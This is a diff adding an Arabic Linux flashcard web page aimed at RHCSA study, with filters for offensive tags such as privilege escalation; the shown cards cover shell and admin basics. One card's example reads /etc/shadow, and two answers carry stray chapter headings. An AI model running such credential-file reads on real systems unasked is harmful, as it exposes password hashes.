@@ -1,0 +1,2488 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Linux Flashcards Pro — بطاقات الاستذكار الاحترافية</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="mobile.css">
+    <link rel="stylesheet" href="features.css">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Outfit:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            overflow: auto !important;
+            height: auto !important;
+            display: block !important;
+            padding: 0;
+            background: radial-gradient(circle at top center, #0b1a30 0%, #030816 100%);
+            font-family: 'Tajawal', sans-serif;
+        }
+        
+        .main-container {
+            display: block !important;
+            overflow: visible !important;
+            max-width: 1300px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        /* Stats & Header Panel */
+        .dashboard-panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 25px;
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+        }
+
+        .stats-group {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 12px 25px;
+            border-radius: 10px;
+            text-align: center;
+            min-width: 120px;
+        }
+
+        .stat-card .num {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--accent);
+            display: block;
+        }
+
+        .stat-card .label {
+            font-size: 0.85rem;
+            color: #94a3b8;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .progress-bar-outer {
+            width: 200px;
+            height: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-bar-inner {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), #10b981);
+            width: 0%;
+            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .progress-percentage {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--success);
+        }
+
+        /* Filter Controls */
+        .controls-panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 25px;
+            backdrop-filter: var(--glass-blur);
+            -webkit-backdrop-filter: var(--glass-blur);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .filter-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .filter-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            flex: 1;
+        }
+
+        .filter-group select {
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 10px 15px;
+            border-radius: 8px;
+            outline: none;
+            cursor: pointer;
+            font-family: inherit;
+            transition: border-color 0.3s;
+        }
+
+        .filter-group select:focus {
+            border-color: var(--accent);
+        }
+
+        .search-box {
+            position: relative;
+            flex: 2;
+            min-width: 280px;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 12px 45px 12px 20px;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: var(--text-main);
+            font-family: inherit;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        .search-box input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        .search-box::after {
+            content: "🔍";
+            position: absolute;
+            top: 50%;
+            right: 15px;
+            transform: translateY(-50%);
+            opacity: 0.6;
+        }
+
+        .view-toggle {
+            display: flex;
+            gap: 10px;
+        }
+
+        .view-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            color: #c9d1d9;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .view-btn.active {
+            background: var(--accent);
+            color: #0d1117;
+            border-color: var(--accent);
+        }
+
+        /* Card Grid View */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .flashcard-wrapper {
+            perspective: 1000px;
+            height: 480px;
+            cursor: pointer;
+        }
+
+        .card-inner {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.6s cubic-bezier(0.4, 0.2, 0.2, 1);
+        }
+
+        .card-inner.flipped {
+            transform: rotateY(180deg);
+        }
+
+        .card-side {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 14px;
+            border: 1px solid var(--border);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            overflow: hidden;
+        }
+
+        .card-front-side {
+            background: linear-gradient(135deg, #0b1528 0%, #070d19 100%);
+        }
+
+        .card-back-side {
+            background: linear-gradient(135deg, #090e1a 0%, #050810 100%);
+            transform: rotateY(180deg);
+            overflow-y: auto;
+        }
+
+        /* Badges & Tags styling */
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding-bottom: 8px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .card-cat {
+            font-size: 0.8rem;
+            color: #94a3b8;
+            font-weight: 700;
+        }
+
+        .header-badges {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+
+        .badge-difficulty {
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 700;
+            border: 1px solid transparent;
+        }
+
+        .diff-Beginner { background: rgba(16, 185, 129, 0.1); color: #10b981; border-color: rgba(16, 185, 129, 0.2); }
+        .diff-Intermediate { background: rgba(59, 130, 246, 0.1); color: #3b82f6; border-color: rgba(59, 130, 246, 0.2); }
+        .diff-Advanced { background: rgba(245, 158, 11, 0.1); color: #f59e0b; border-color: rgba(245, 158, 11, 0.2); }
+        .diff-Expert { background: rgba(239, 68, 68, 0.1); color: #ef4444; border-color: rgba(239, 68, 68, 0.2); }
+        .diff-OSCP { background: rgba(139, 92, 246, 0.1); color: #a78bfa; border-color: rgba(139, 92, 246, 0.2); }
+        .diff-RedTeam { background: rgba(236, 72, 153, 0.1); color: #f472b6; border-color: rgba(236, 72, 153, 0.2); }
+
+        .badge-usedin {
+            font-size: 0.65rem;
+            background: rgba(234, 179, 8, 0.1);
+            border: 1px solid rgba(234, 179, 8, 0.2);
+            color: #eab308;
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-weight: 700;
+        }
+
+        .badge-state {
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 700;
+        }
+
+        .badge-mastered { background: rgba(16, 185, 129, 0.2); color: #10b981; }
+        .badge-review { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }
+
+        /* Question & Answer Content */
+        .card-question {
+            font-size: 1.05rem;
+            line-height: 1.6;
+            color: #f0f6fc;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: right;
+            font-weight: 700;
+            margin: 15px 0;
+        }
+
+        .card-answer-section {
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding-bottom: 12px;
+            margin-bottom: 12px;
+        }
+
+        .card-answer-label {
+            font-size: 0.8rem;
+            color: var(--accent);
+            font-weight: 700;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .card-answer {
+            font-size: 0.95rem;
+            line-height: 1.6;
+            color: #e6edf3;
+        }
+
+        .card-answer code, .detail-body code {
+            font-family: 'Fira Code', monospace;
+            background: rgba(0,0,0,0.3);
+            color: #58a6ff;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            word-break: break-all;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        /* Tags Footer */
+        .card-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 10px;
+        }
+
+        .badge-tag {
+            font-size: 0.65rem;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            color: #8b949e;
+            padding: 1px 6px;
+            border-radius: 4px;
+        }
+
+        .card-footer-hint {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #8b949e;
+            margin-top: auto;
+            animation: pulse-light 2s infinite;
+        }
+
+        /* Interactive Collapsible Details */
+        .card-details-container {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        details.card-detail {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        details.card-detail[open] {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: rgba(88, 166, 255, 0.3);
+        }
+
+        details.card-detail summary {
+            padding: 6px 12px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: #58a6ff;
+            cursor: pointer;
+            list-style: none;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            user-select: none;
+        }
+
+        details.card-detail summary::-webkit-details-marker {
+            display: none;
+        }
+
+        details.card-detail summary::after {
+            content: "▾";
+            font-size: 0.75rem;
+            transition: transform 0.2s;
+        }
+
+        details.card-detail[open] summary::after {
+            content: "▴";
+        }
+
+        details.card-detail .detail-body {
+            padding: 8px 12px;
+            font-size: 0.78rem;
+            color: #c9d1d9;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            line-height: 1.5;
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        /* Card Actions */
+        .card-actions {
+            display: flex;
+            gap: 8px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            padding-top: 12px;
+            margin-top: auto;
+        }
+
+        .card-action-btn {
+            flex: 1;
+            border: none;
+            padding: 8px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: 700;
+            font-size: 0.8rem;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .btn-need-review {
+            background: rgba(245, 158, 11, 0.1);
+            color: var(--warning);
+            border: 1px solid rgba(245, 158, 11, 0.2);
+        }
+
+        .btn-need-review:hover {
+            background: rgba(245, 158, 11, 0.2);
+        }
+
+        .btn-mastered {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .btn-mastered:hover {
+            background: rgba(16, 185, 129, 0.2);
+        }
+
+        .btn-flip-back {
+            background: rgba(255, 255, 255, 0.05);
+            color: #8b949e;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+        }
+
+        .btn-flip-back:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+        }
+
+        /* Focus View Layout */
+        .focus-view {
+            display: none;
+            max-width: 750px;
+            margin: 0 auto;
+        }
+
+        .focus-controls {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            background: var(--panel-bg);
+            padding: 15px 25px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .focus-card-wrapper {
+            height: 520px;
+        }
+
+        .focus-card-wrapper .card-question {
+            font-size: 1.25rem;
+        }
+
+        @keyframes pulse-light {
+            0% { opacity: 0.4; }
+            50% { opacity: 0.8; }
+            100% { opacity: 0.4; }
+        }
+    </style>
+</head>
+<body>
+    <header class="navbar">
+        <div class="logo">
+            <h1>Linux Academy</h1>
+            <span class="subtitle">Linux Flashcards Pro — بطاقات الاستذكار الاحترافية</span>
+        </div>
+        <div class="nav-buttons">
+            <a href="index.html" class="top-btn" style="margin-left: 5px;">🏠 الرئيسية</a>
+            <a href="academy.html" class="top-btn" style="margin-left: 5px;">📚 الدروس</a>
+            <a href="encyclopedia.html" class="top-btn" style="margin-left: 5px;">📖 الموسوعة</a>
+            <a href="cheatsheet.html" class="top-btn" style="margin-left: 5px;">📝 ورقة الغش</a>
+            <a href="exam.html" class="top-btn" style="margin-left: 5px;">⚔️ المحاكي</a>
+            <a href="interview.html" class="top-btn" style="margin-left: 5px;">💬 المقابلات</a>
+            <a href="bandit.html" class="top-btn">🕵️‍♂️ Bandit</a>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <!-- Dashboard Panel -->
+        <div class="dashboard-panel">
+            <div class="stats-group">
+                <div class="stat-card">
+                    <span class="num" id="statTotal">100</span>
+                    <span class="label">إجمالي البطاقات</span>
+                </div>
+                <div class="stat-card">
+                    <span class="num" id="statMastered" style="color: var(--success);">0</span>
+                    <span class="label">تم حفظها</span>
+                </div>
+                <div class="stat-card">
+                    <span class="num" id="statReview" style="color: var(--warning);">0</span>
+                    <span class="label">تحتاج مراجعة</span>
+                </div>
+            </div>
+            
+            <div class="progress-container">
+                <span class="label">نسبة الإتقان:</span>
+                <div class="progress-bar-outer">
+                    <div class="progress-bar-inner" id="statProgress"></div>
+                </div>
+                <span class="progress-percentage" id="statPercent">0%</span>
+            </div>
+        </div>
+
+        <!-- Controls Panel -->
+        <div class="controls-panel">
+            <div class="filter-row">
+                <div class="filter-group">
+                    <select id="categoryFilter" style="min-width: 200px;">
+                        <option value="all">📂 كل الفصول والأقسام</option>
+                        <option value="1️⃣ التفاعل مع النظام وCLI">1️⃣ التفاعل مع النظام وCLI</option>
+                        <option value="2️⃣ معالجة النصوص وBash Scripting">2️⃣ معالجة النصوص وBash Scripting</option>
+                        <option value="3️⃣ الهوية والصلاحيات (DAC)">3️⃣ الهوية والصلاحيات (DAC)</option>
+                        <option value="4️⃣ العمليات والخدمات">4️⃣ العمليات والخدمات</option>
+                        <option value="5️⃣ البرمجيات والمستودعات">5️⃣ البرمجيات والمستودعات</option>
+                        <option value="6️⃣ الشبكات">6️⃣ الشبكات</option>
+                        <option value="7️⃣ جدار الحماية والوصول عن بعد">7️⃣ جدار الحماية والوصول عن بعد</option>
+                        <option value="8️⃣ التخزين">8️⃣ التخزين</option>
+                        <option value="9️⃣ الأرشفة والجدولة">9️⃣ الأرشفة والجدولة</option>
+                        <option value="🔟 SELinux">🔟 SELinux</option>
+                        <option value="1️⃣1️⃣ الإقلاع والإصلاح">1️⃣1️⃣ الإقلاع والإصلاح</option>
+                        <option value="1️⃣2️⃣ الأتمتة والحاويات">1️⃣2️⃣ الأتمتة والحاويات</option>
+                        <option value="🏆 أسئلة سيناريو (Scenario-Based)">🏆 أسئلة سيناريو (Scenario-Based)</option>
+                    </select>
+
+                    <select id="difficultyFilter">
+                        <option value="all">⭐ كل الصعوبات</option>
+                        <option value="Beginner">🟢 Beginner (مبتدئ)</option>
+                        <option value="Intermediate">🔵 Intermediate (متوسط)</option>
+                        <option value="Advanced">🔴 Advanced (متقدم)</option>
+                        <option value="Expert">⚫ Expert (خبير)</option>
+                        <option value="OSCP">🟣 OSCP (هجومي)</option>
+                        <option value="Red Team">🟠 Red Team (فريق أحمر)</option>
+                    </select>
+
+                    <select id="tagFilter">
+                        <option value="all">🏷️ كل التصنيفات والوسوم</option>
+                        <option value="Filesystem">Filesystem (نظام الملفات)</option>
+                        <option value="Bash">Bash (برمجة شل)</option>
+                        <option value="Networking">Networking (الشبكات)</option>
+                        <option value="Systemd">Systemd (الخدمات)</option>
+                        <option value="Storage">Storage (التخزين)</option>
+                        <option value="SELinux">SELinux (أمان الحماية)</option>
+                        <option value="Containers">Containers (الحاويات)</option>
+                        <option value="Privilege Escalation">Privilege Escalation (ترقية الصلاحيات)</option>
+                        <option value="GTFOBins">GTFOBins (هروب الأدوات)</option>
+                        <option value="Defensive">Defensive (الدفاع الفني)</option>
+                        <option value="Capabilities">Capabilities (قدرات الملف)</option>
+                        <option value="Bash Internals">Bash Internals (أكواد شل الداخلية)</option>
+                        <option value="SSH">SSH (الاتصال الآمن)</option>
+                        <option value="Logs">Logs (السجلات)</option>
+                    </select>
+
+                    <select id="stateFilter">
+                        <option value="all">👁️ عرض كل البطاقات</option>
+                        <option value="unstarted">🆕 لم تبدأ بعد</option>
+                        <option value="review">🔄 قيد المراجعة</option>
+                        <option value="mastered">✅ المحفوظة فقط</option>
+                    </select>
+                </div>
+
+                <div class="view-toggle">
+                    <button class="view-btn active" id="btnGridView" onclick="switchView('grid')">📱 عرض الشبكة</button>
+                    <button class="view-btn" id="btnFocusView" onclick="switchView('focus')">🎯 وضع التركيز</button>
+                </div>
+            </div>
+
+            <div class="filter-row">
+                <div class="search-box">
+                    <input type="text" id="cardSearch" placeholder="ابحث عن أمر، سيناريو، تصنيف، أو وسم...">
+                </div>
+                <button class="btn" style="background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); color: var(--danger); font-weight: 700; height: 100%;" onclick="resetProgress()">🔄 تصفير التقدم الدراسي</button>
+            </div>
+        </div>
+
+        <!-- Grid View -->
+        <div class="cards-grid" id="cardsGrid">
+            <!-- Cards injected here -->
+        </div>
+
+        <!-- Focus View -->
+        <div class="focus-view" id="focusView">
+            <div class="flashcard-wrapper focus-card-wrapper" onclick="toggleFocusCard()">
+                <div class="card-inner" id="focusCardInner">
+                    <!-- Front -->
+                    <div class="card-side card-front-side">
+                        <div class="card-header">
+                            <span class="card-cat" id="focusCardCat"></span>
+                            <div class="header-badges" id="focusCardBadgesFront"></div>
+                        </div>
+                        <div class="card-question" id="focusCardQ"></div>
+                        <div class="card-tags" id="focusCardTagsFront"></div>
+                        <div class="card-footer-hint">👆 اضغط لمعاينة الإجابة والتفاصيل</div>
+                    </div>
+                    <!-- Back -->
+                    <div class="card-side card-back-side" id="focusCardBack" onclick="event.stopPropagation()">
+                        <div class="card-header">
+                            <span class="card-cat" id="focusCardCatBack"></span>
+                            <button class="btn-flip-back" onclick="toggleFocusCard()">↩️ قلب البطاقة</button>
+                        </div>
+                        
+                        <div class="card-answer-section">
+                            <span class="card-answer-label">🔑 الإجابة والأمر الأساسي:</span>
+                            <div class="card-answer" id="focusCardA"></div>
+                        </div>
+
+                        <div class="card-details-container" id="focusCardDetails">
+                            <!-- Injected details -->
+                        </div>
+
+                        <div class="card-actions" id="focusCardActions">
+                            <!-- Injected actions -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="focus-controls">
+                <button class="view-btn" id="btnFocusPrev" onclick="navigateFocus(-1)">❮ السابق</button>
+                <span id="focusProgressText" style="font-weight: 700; color: #8b949e;">0 / 0</span>
+                <button class="view-btn" id="btnFocusNext" onclick="navigateFocus(1)">التالي ❯</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script tags at the bottom -->
+    <script>
+        // Premium Flashcards Database (100 cards)
+        const flashcardsData = [
+            {
+                id: 1,
+                cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Beginner",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
+                q: `ما هو FHS وما هي أهم الأدلة فيه؟`,
+                a: `Filesystem Hierarchy Standard — الهيكل القياسي لأنظمة الملفات:
+/etc — ملفات التهيئة
+/var — بيانات متغيرة (سجلات، قواعد بيانات)
+/usr — برمجيات ومكتبات
+/home — مساحات المستخدمين الشخصية
+/tmp — ملفات مؤقتة
+/boot — ملفات الإقلاع`,
+                example: `ls -ld /etc /var/log`,
+                mistakes: `وضع ملفات التكوين والتهيئة في أدلة متطايرة مثل /tmp مما يؤدي لحذفها.`,
+                lab: `افحص ملفات التهيئة في <code>/etc</code> وسجلات النظام في <code>/var/log</code>.`,
+                ref: `man hier (هيكلية نظام الملفات)`,
+                related: ['ls', 'find', 'tree']
+            },
+            {
+                id: 2,
+                cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Beginner",
+                tags: ['Filesystem'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين man و pinfo؟`,
+                a: `man — صفحات التوثيق التقليدية. pinfo — واجهة أكثر تفاعلية لقراءة Info Pages.`,
+                example: `pinfo tar`,
+                mistakes: `الضغط المتكرر على الأسهم في man بدلاً من التنقل السريع بالروابط في pinfo.`,
+                lab: `افتح دليل المساعدة: <code>pinfo coreutils</code> وتصفح الأقسام التشعبية.`,
+                ref: `man pinfo`,
+                related: ['man', 'info', 'help']
+            },
+            {
+                id: 3,
+                cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Intermediate",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هي RHEL Lightspeed؟`,
+                a: `مساعد ذكاء اصطناعي مدمج في RHEL يساعد المسؤولين بحلول توجيهية بناءً على سياق المشكلة.`,
+                example: `RHEL Lightspeed Chat`,
+                mistakes: `اعتقاد أنها أداة عامة؛ هي مخصصة لمهام RHEL ومحكمة أمنياً داخل السيرفر.`,
+                lab: `راجع لوحة التحكم الخاصة بـ Hybrid Cloud Console لتفعيل المساعد.`,
+                ref: `Red Hat Lightspeed Documentation`,
+                related: ['ansible', 'cockpit']
+            },
+            {
+                id: 4,
+                cat: "1️⃣ التفاعل مع النظام وCLI",
+                difficulty: "Intermediate",
+                tags: ['Filesystem', 'Bash'],
+                usedIn: ['RHCSA'],
+                q: `كيف تنشئ هيكل مجلدات معقد بأمر واحد؟`,
+                a: `استخدم Brace Expansion: mkdir -p /project/{docs,src,tests}/{2024,2025}
+2️⃣ معالجة النصوص وBash Scripting`,
+                example: `mkdir -p /project/{docs,src,tests}/{2024,2025}`,
+                mistakes: `نسيان خيار <code>-p</code> مما يؤدي إلى فشل الأمر لعدم وجود المجلد الأب.`,
+                lab: `نفّذ الأمر لإنشاء هيكل مجلدات معقد وتأكد بالـ <code>tree</code>.`,
+                ref: `man mkdir`,
+                related: ['tree', 'mkdir']
+            },
+            {
+                id: 5,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Beginner",
+                tags: ['Bash', 'Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
+                q: `ما هي الثلاثة مسارات افتراضية للبيانات في Linux؟`,
+                a: `STDIN (0) — الإدخال، STDOUT (1) — الإخراج، STDERR (2) — الأخطاء.`,
+                example: `cat < input.txt > output.txt 2> error.log`,
+                mistakes: `الخلط بين مخرجات النجاح والخطأ؛ نسيان توجيه الخطأ بشكل منفصل عند كتابة السكربتات.`,
+                lab: `جرب تشغيل أمر خاطئ ووجه الخطأ لملف: <code>ls /not_exist 2> err.log</code>.`,
+                ref: `Bash Standard Streams Reference`,
+                related: ['grep', 'tee']
+            },
+            {
+                id: 6,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Beginner",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين > و >>؟`,
+                a: `> — إعادة توجيه مع إعادة كتابة (overwrite). >> — إلحاق (append) بدون حذف المحتوى السابق.`,
+                example: `echo "New log entry" >> /var/log/app.log`,
+                mistakes: `استخدام <code>></code> بالخطأ مما يتسبب في تدمير وحذف بيانات الملف السابقة بالكامل.`,
+                lab: `أضف نصاً لملف بـ <code>>></code> ثم اقرأه بـ <code>cat</code> للتأكد من عدم مسح القديم.`,
+                ref: `man bash (قسم Redirection)`,
+                related: ['echo', 'cat', 'tee']
+            },
+            {
+                id: 7,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
+                q: `ما هو Shebang وما هي صيغته القياسية في RHEL؟`,
+                a: `السطر الأول في السكربت يحدد المفسر: #!/usr/bin/bash أو #!/bin/bash`,
+                example: `#!/usr/bin/bash`,
+                mistakes: `كتابة مسار خاطئ للمفسر أو وضع مسافات قبل الرمز <code>#!</code> مما يجعل النظام يتعامل مع الملف كملف نصي عادي.`,
+                lab: `أنشئ ملفاً يبدأ بـ <code>#!/usr/bin/bash</code>، واجعله تنفيذاً عبر <code>chmod +x</code> وشغله.`,
+                ref: `Bash Programming Guide`,
+                related: ['chmod', 'env']
+            },
+            {
+                id: 8,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash', 'Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
+                q: `ما الفرق بين علامات الاقتباس المفردة '' والمزدوجة "" في Bash؟`,
+                a: `'' — تجريد كل الرموز من معانيها الخاصة (literal). "" — تحافظ على استبدال المتغيرات والأوامر الفرعية.`,
+                example: `echo "$USER" # يفسر المتغير\necho '$USER' # يطبع حرفياً`,
+                mistakes: `استخدام علامات الاقتباس المفردة وتوقع تفسير المتغيرات مثل <code>'$VAR'</code>.`,
+                lab: `جرب تنفيذ المثالين أعلاه في الطرفية لملاحظة الفرق بوضوح.`,
+                ref: `Bash Quoting Rules`,
+                related: ['echo', 'export']
+            },
+            {
+                id: 9,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
+                q: `ما هو كود الخروج (Exit Code) وما هو كود النجاح؟`,
+                a: `المتغير $? يحمل كود الخروج. 0 = نجاح، أي قيمة أخرى = فشل.`,
+                example: `ping -c 1 8.8.8.8 && echo $?`,
+                mistakes: `افتراض أن أي قيمة غير الصفر تعني النجاح؛ في لينكس الصفر هو النجاح الوحيد.`,
+                lab: `شغّل <code>ls /random_folder</code> ثم <code>echo $?</code> لمشاهدة كود الفشل (عادة 2).`,
+                ref: `Bash Exit Status Documentation`,
+                related: ['if', 'test']
+            },
+            {
+                id: 10,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Advanced",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
+                q: `كيف تستخدم حلقة for لتطبيق إعدادات على عدة خوادم؟`,
+                a: `for HOST in servera serverb serverc; do ssh $HOST 'sudo systemctl restart httpd'; done`,
+                example: `for h in srv1 srv2; do ssh $h 'uptime'; done`,
+                mistakes: `نسيان الفاصلة المنقوطة <code>;</code> قبل كلمة <code>do</code> و <code>done</code> عند كتابة الحلقة في سطر واحد.`,
+                lab: `جرب تشغيل حلقة بسيطة محلياً: <code>for name in abdo user admin; do echo "Hello $name"; done</code>.`,
+                ref: `Bash Loop Constructs Manual`,
+                related: ['while', 'ssh']
+            },
+            {
+                id: 11,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Advanced",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
+                q: `ما هي Regex وما الفرق بين Basic و Extended؟`,
+                a: `Regular Expressions — أنماط للبحث في النصوص. grep = Basic. grep -E أو egrep = Extended (يدعم |, +, ?, {}).`,
+                example: `grep -E "root|bin" /etc/passwd`,
+                mistakes: `استخدام الرموز مثل <code>|</code> في grep العادي دون هروب وتوقع عملها كعلاقة 'أو'.`,
+                lab: `ابحث في ملفpasswd عن السطور التي تحتوي root أو bin باستخدام كلا التنسيقين.`,
+                ref: `man grep`,
+                related: ['sed', 'awk']
+            },
+            {
+                id: 12,
+                cat: "2️⃣ معالجة النصوص وBash Scripting",
+                difficulty: "Intermediate",
+                tags: ['Bash'],
+                usedIn: ['RHCSA'],
+                q: `ما معنى ^ و $ في Regex؟`,
+                a: `^ = بداية السطر، $ = نهاية السطر.
+3️⃣ الهوية والصلاحيات (DAC)`,
+                example: `grep "^root" /etc/passwd`,
+                mistakes: `كتابة الرمز في مكان خاطئ، مثل <code>root^</code> بدلاً من <code>^root</code>.`,
+                lab: `قم بتصفية ملف passwd لعرض الحسابات التي تستخدم shell من نوع bash فقط.`,
+                ref: `Regex Anchors Reference Guide`,
+                related: ['grep', 'sed']
+            },
+            {
+                id: 13,
+                cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
+                q: `أين تُحفظ بيانات المستخدمين المحليين وكلمات المرور؟`,
+                a: `/etc/passwd — بيانات المستخدمين. /etc/shadow — كلمات المرور المشفرة (للقراءة فقط من root).`,
+                example: `cat /etc/passwd\nsudo cat /etc/shadow`,
+                mistakes: `تغيير صلاحيات shadow لتكون مقروءة للجميع، مما يسهل استخراج كلمات المرور المشفرة وتخمينها.`,
+                lab: `افحص الصلاحيات الافتراضية للملفين بـ <code>ls -l</code>.`,
+                ref: `man passwd / man shadow`,
+                related: ['useradd', 'chown']
+            },
+            {
+                id: 14,
+                cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Beginner",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
+                q: `ما هي سياسة User Private Groups في RHEL؟`,
+                a: `عند إنشاء مستخدم، يُنشأ مجموعة بنفس اسم المستخدم لتسهيل إدارة الصلاحيات المشتركة.`,
+                example: `useradd adminuser`,
+                mistakes: `الاعتقاد بأن مجموعات المستخدم تُنشأ يدوياً دائماً؛ النظام يسهل ذلك بسياسة UPG.`,
+                lab: `أنشئ مستخدماً واحداً ولاحظ مجموعته الخاصة بـ <code>id</code>.`,
+                ref: `RHEL User Management Guide`,
+                related: ['groupadd', 'id']
+            },
+            {
+                id: 15,
+                cat: "3️⃣ الهوية والصلاحيات (DAC)",
+                difficulty: "Intermediate",
+                tags: ['Permissions'],
+                usedIn: ['RHCSA'],
